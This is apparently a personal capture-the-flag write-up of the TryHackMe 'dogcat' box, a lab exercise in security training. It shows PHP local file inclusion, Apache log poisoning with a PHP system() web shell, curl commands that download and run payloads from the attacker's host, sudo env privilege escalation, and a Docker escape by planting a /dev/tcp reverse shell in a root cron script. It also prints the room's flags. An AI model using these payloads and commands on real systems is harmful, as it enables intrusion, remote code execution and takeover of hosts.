# dogcat

## recon

10.10.74.214 - "I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container."

is the target Linux?

```
┌─[✗]─[monty@parrot]─[~/ctfs/thm/dogcat]─[Sat 13 Feb 2021 03:09:55 AM UTC]
└──╼ $ping 10.10.74.214
PING 10.10.74.214 (10.10.74.214) 56(84) bytes of data.
64 bytes from 10.10.74.214: icmp_seq=1 ttl=61 time=200 ms
64 bytes from 10.10.74.214: icmp_seq=2 ttl=61 time=253 ms
64 bytes from 10.10.74.214: icmp_seq=3 ttl=61 time=217 ms
64 bytes from 10.10.74.214: icmp_seq=4 ttl=61 time=260 ms
64 bytes from 10.10.74.214: icmp_seq=5 ttl=61 time=223 ms
```

yep, most likely, ttl 61. [reference](https://subinsb.com/default-device-ttl-values/)

### 80 http

description mentions LFI, likely using an include function, can test using known files

`http://10.10.74.214/?view=index.php` should return the same as `http://10.10.74.214/index.php`

it does not

is there somethng appending `.php` to the URL/URI?

trying `http://10.10.74.214/?view=cat/../../../../../../../../../../etc/passwd`

```
Warning: include(cat/../../../../../../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'cat/../../../../../../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

yep, include function with `.php` appended

php filter exfil to pull `cat.php` source code

[reference](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

`view-source:http://10.10.74.214/?view=php://filter/convert.base64-encode/resource=cat`

```
┌─[monty@parrot]─[~/ctfs/thm/dogcat]─[Sat 13 Feb 2021 03:53:44 AM UTC]
└──╼ $echo PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```
_same b64 string for dog_

Grabbing index.php - _has to have *dog* or *cat* in the strings - some custom filter?_

`view-source:http://10.10.74.214/?view=php://filter/convert.base64-encode/resource=cat/../index`

```
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

Vulnerable code

- we have LFI with include
- we can supply custom extensions as a GET `ext` parameter

```
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;

```

we control `ext` and set to anything, can we set to null?

`view-source:http://10.10.74.214/?view=cat/../../../../../../../../../../../etc/passwd&ext=`

yep

```
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

grabbed /etc/passwd as proof of concept, not any interesting users

need to look for ssh keys, config files, log files, etc. anything that can provide more info on the host, any users, or preferable anything we can control to get rce

odd /etc/hosts entry

```
127.0.0.1	localhost
::1		localhost ip6-localhost ip6-loopback
fe00::0		ip6-localnet
ff00::0		ip6-mcastprefix
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
172.17.0.2	8d1b38bdb6f9
```

tried to pull ssh daemon config, root ssh keys and authorized keys file. none returned

http and ftp wrappers are disabled, cannot download remote files

rce via logs

`view-source:http://10.10.74.214/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log`

1. create reverse shell, `shellclip --lhost 10.2.14.14 --lport 53 -c php; vim upload.php`
2. take single quotes out, `grep -n "'" upload.php`
3. run curl with the contents as parameter

That did not work and the machine expired, taking a break

## ctf reset 1

### more recon

Restarted the host and it is now at 10.10.143.216

using double qoutes in the payload broke the access log

`syntax error, unexpected '&quot;cmd\&quot;]);?&gt;&quot;' (T_CONSTANT_ENCAPSED_STRING), expecting identifier (T_STRING) in <b>/var/log/apache2/access.log`

## ctf reset 2

reset the machine again and it is now at 10.10.5.7

Using burpsuite to URL encode and send payloads, curl is installed, using curl to download linper and run it

This is what returned

```
[92m[+][0m Method Found: bash
-----------------------
[92m[+][0m Method Found: perl
-----------------------
[92m[+][0m Method Found: php
-----------------------
[92m[+][0m Web Server Poison Attack Available for the Following Directories
[+] /var/www/html
[+] /var/www/html/cats
[+] /var/www/html/dogs
-----------------------
```

### initial foothold

Uploaded revshell.php and executed it, got a basic reverse shell back

`curl http://10.10.74.214/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=curl%20http%3A%2F%2F10.2.14.14%3A8000%2Fupload.php%20-o%20upload.php%3B%20php%20upload.php`

got the first flag

```
$cat flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

got a pwncat session running and found the second flag

```
(remote) www-data@2673affc99e1:/var/www$ cat flag2_QMW7JvaY2LvK.txt 
THM{LF1_t0_RC3_aec3fb}
```

interesting pwncat info - looking for low-hanging privesc oppurtnities

```
local) pwncat$ run enumerate                                                                       
Module 'enumerate' Results                     
system.init                                                                                         
  - Running Init.UNKNOWN                          
software.sudo.rule                                
  - User data: /usr/bin/env as root on local (NOPASSWD)      
system.kernel.version                             
  - Running Linux Kernel 4.15.0-96-generic
system.arch                                       
  - Running on a x86_64 processor
system.hostname
  - 2673affc99e1
system.container
  - Running in a docker container
```

machine expired, taking a break

## ctf reset 3

new ip is 10.10.202.194

bricked the access log and cannot figure out another LFI oppurtunity, restarting the host

## ctf reset 4

new ip is 10.10.121.150

### re-establishing foothold

payload to plant php rce in log file

```
GET /?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log HTTP/1.1
Host: 10.10.121.150
User-Agent: <?php system($_GET['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.121.150/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

payload to execute rce *(notice c=id at the end)*

```
GET /?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=id HTTP/1.1
Host: 10.10.121.150
User-Agent: <?php system($_GET['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.121.150/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

### privesc to root (in container)

Esclated to root inside the container

```
(remote) www-data@25ddec30f0a3:/$ sudo /usr/bin/env /bin/bash
root@25ddec30f0a3:/# if
> ^C
root@25ddec30f0a3:/# id
uid=0(root) gid=0(root) groups=0(root)
root@25ddec30f0a3:/# ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
root@25ddec30f0a3:/# cd root
root@25ddec30f0a3:~# ls
flag3.txt
root@25ddec30f0a3:~# cat flag3.txt 
THM{D1ff3r3nt_3nv1ronments_874112}

```

Now need to find a container escape

- cronjob for backing up container?
    - basically any process/job that interfaces between host and container fs
- obscure mount points? mounting a part of the host in the container? is that possible?

## ctf reset 5

new ip 10.10.42.190

### making initial foothold scriptable w/ curl

using curl this time to plant rce, used burpsuite to buld curl request

`curl -i -s -k -X $'GET' -H $'Host: 10.10.42.190' -H $'User-Agent: <?php system($_GET[\'c\']); ?>' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://10.10.42.190/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' $'http://10.10.42.190/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log'`

manual enumeration via cURL

`curl 'http://10.10.42.190/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=uname%20-a'`

can the target reach github?

`curl 'http://10.10.42.190/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=curl%20https%3A%2F%2Fgithub.com'`

it hangs so I guess not, downloading linper from our own webserver like last time

`curl 'http://10.10.42.190/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=curl%20http%3A%2F%2F10.2.14.14%3A8000%2Flinper.sh%20-o%20linper.sh'`

using [this website](https://www.urlencoder.org/) to encode commands and use them in curl

### presistence and privesc

for some reason cannot execute linper - not sure why

looking for privescs to host fs, found interesting cron

```
(remote) root@e7661ce94bdf:/etc/cron.daily$ cat passwd 
#!/bin/sh

cd /var/backups || exit 0

for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done
```

### offline research

machine expired - going to do some research on this script to see how it is exploitable

psuedo-code

```
for each FILE
    if file does not exist, go to next file
    if /var/backup/FILE.bak = /etc/FILE, go to next file
    else
	copy /etc/$FILE /var/backups/FILE.bak
	chmod 600 /var/backups/FILE.bak
```

if I can edit /var/backups/shadow, and monitor that file, then I should be able to `cat` the file when the cron job runs and copies from /etc/shadow

can root in the container just `cat /etc/shadow`?

## ctf reset 6

new target IP 10.10.252.138

### more scripting for initial foothold, regex

using regex to make the web exploit pretty

```
┌─[monty@parrot]─[~/ctfs/thm/dogcat]─[Sun 07 Mar 2021 03:04:27 AM UTC]
└──╼ $curl -s 'http://10.10.252.138/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=uname%20-a' | grep "07/Mar/2021:03:00:55" | sed 's/.*http:\/\/10.10.42.190\/\" \"//g' | sed 's/Wed.*//g'
```

so that passwd cron does not seem to be viable, I have access to all files involved and can just cat /etc/shadow, which does not provide anything useful

*re-stablished foothold with php file - technique described above*
*escalated to root with sudo - technique described above*

### privesc to root (on host OS)

ran linpeas from /root/ in container as root

```
[+] Modified interesting files in the last 5mins (limit 100)
/opt/backups/backup.tar
...
[+] Backup files
-rw-r--r-- 1 root root 2949120 Mar  7 03:32 /opt/backups/backup.tar
-rwxr--r-- 1 root root 69 Mar 10  2020 /opt/backups/backup.sh
...
[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limi
t 70) - no PHP files
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
```

- what are the backup files?
- is that php password relevant? xxj31ZMTZzkVA

```
(remote) root@c580e37f74e4:/opt/backups$ cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
(remote) root@c580e37f74e4:/opt/backups$ ls -lha
total 2.9M
drwxr-xr-x 2 root root 4.0K Apr  8  2020 .
drwxr-xr-x 1 root root 4.0K Mar  7 02:57 ..
-rwxr--r-- 1 root root   69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2.9M Mar  7 03:46 backup.tar
```

- /root/container/backup/backup.tar (on host OS) = /opt/backup.tar (in container)
- looks like the backup.sh script runs every minute
- I can edit backup.sh, which appears to be ran by root on host OS

Confirmed the host OS can reach me

altered backup script

```
(remote) root@c580e37f74e4:/opt/backups$ cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

ping -c 4 10.2.14.14
```

listening for icmp on attack box

`sudo tcpdump -i tun0 icmp`

tried running linper with backup.sh, no callback?

replaced backup.sh with this

```
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

/bin/bash -i >& /dev/tcp/10.2.14.14/4444 0>&1
```

got a callback as root - proof

```
root@dogcat:~# hostname;id;ip a s
hostname;id;ip a s
dogcat
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:2f:57:2a:28:e1 brd ff:ff:ff:ff:ff:ff
    inet 10.10.252.138/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2805sec preferred_lft 2805sec
    inet6 fe80::2f:57ff:fe2a:28e1/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:f9:17:53:ff brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:f9ff:fe17:53ff/64 scope link 
       valid_lft forever preferred_lft forever
5: veth5566ccf@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 9a:e9:26:f4:d7:eb brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::98e9:26ff:fef4:d7eb/64 scope link 
       valid_lft forever preferred_lft forever
```

so root on the host OS did not execute linper because of something to do with file paths between the host and container. to the host `/root/container/root/` does not exist but `/root/container/backup/` does

[digital ocan blog](https://www.digitalocean.com/community/tutorials/how-to-share-data-between-the-docker-container-and-the-host) talks about this, bindmounting a directory to a host file system and the prerquisite of have a non-root user with sudo priveleges. this matches with the theme of the box. also, the docker container port 80 is forwarded to host OS port 80. the methodology described in the blog appears to be how the container was built.
